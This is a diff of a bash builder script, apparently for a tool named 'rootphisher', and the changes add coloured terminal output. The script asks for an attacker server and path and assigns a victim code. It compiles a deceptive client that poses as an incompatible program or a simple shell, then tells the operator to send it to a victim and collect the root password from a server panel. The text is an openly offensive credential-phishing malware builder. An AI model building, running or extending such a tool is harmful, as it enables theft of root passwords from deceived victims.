@@ -1,4 +1,10 @@
 #!/bin/bash
+
+RED="\033[1;31m"
+GREEN="\033[1;32m"
+BLUE="\033[1;34m"
+NOCOLOR="\033[0m"
+
 clear
 cat files/banner # shows baner
 echo ""
@@ -11,44 +17,44 @@ echo "[i] Follow the options to configure the client."
 echo ""
 pwds=$(pwd)
 echo "Current: $pwds"
-echo -n "[=] Path to generate the client: " # path to generate
+echo -n "\033[1;32m[=] Path to generate the client: \033[0m" # path to generate
 read path
 echo ""
 echo ""
 echo "Eg.: client"
-echo -n "[=] Name for the file: "
+echo -n "\033[1;32m[=] Name for the file:\033[0m "
 read name
 echo ""
 echo ""
 echo "Eg.: attacker.com, ONLY SERVER!"
-echo -n "[=] Your server : "
+echo -n "\033[1;32m[=] Your server : \033[0m"
 read server
 echo ""
 echo ""
 echo "Eg.: if the path is 'attacker.com/rootphisher/pwn', type 'rootphisher/pwn'"
 echo "(Without '/')"
 echo "If it is '/' leave it in blank"
-echo -n "[=] Server Path: "
+echo -n "\033[1;32m[=] Server Path: \033[0m"
 read rpath
 code=$(shuf -n 1 -i 0-5000)
 echo ""
 echo "GIVEN OPTIONS"
 echo "================"
 echo ""
-echo "Name: $name"
-echo "Victim code: $code"
-echo "Server: http://$server/$rpath"
-echo "Path: $path"
+echo "\033[1;34mName:\033[0m $name"
+echo "\033[1;34mVictim code:\033[0m $code"
+echo "\033[1;34mServer:\033[0m http://$server/$rpath"
+echo "\033[1;34mPath:\033[0m $path"
 echo ""
 echo ""
 echo "CLIENTS"
 echo "=========="
-echo "1) Error_Msg_Client => After the execution, shows you an error saying software not compatible or a non-rooted user executed the program."
+echo "1) \033[1;31mError_Msg_Client\033[0m => After the execution, shows you an error saying software not compatible or a non-rooted user executed the program."
 echo ""
-echo "2) Cmd_Prompt_Client => After the execution, open a very simple command shell line."
+echo "2) \033[1;31mCmd_Prompt_Client\033[0m => After the execution, open a very simple command shell line."
 echo ""
 echo ""
-echo "Enter the number of the option do you want."
+echo "\033[1;32m[*] Enter the number of the option do you want.\033[0m"
 echo ""
 echo -n "Client> "
 read opt
@@ -76,10 +82,10 @@ rm .client
 echo "[*] Compiling the C file ..."
 gcc -o $path/$name $path/$name.c > /dev/null 2>&1
 rm $path/$name.c
-echo "[+] Done."
+echo "\033[1;32m[+] Done.\033[0m"
 echo "[+] Executable generated successfully in $path/$name"
 echo "[*] Saving configuration in codes/$code"
-echo "[+] Done."
+echo "\033[1;32m[+] Done.\033[0m"
 echo "[i] Now send the executable to your victim and wait to obtain root password ;)"
 echo "[i] Find the root password in the Server Panel by searching for the victim code showed before"
 echo "[i] Default Server Panel Access Credentials => admin:admin"
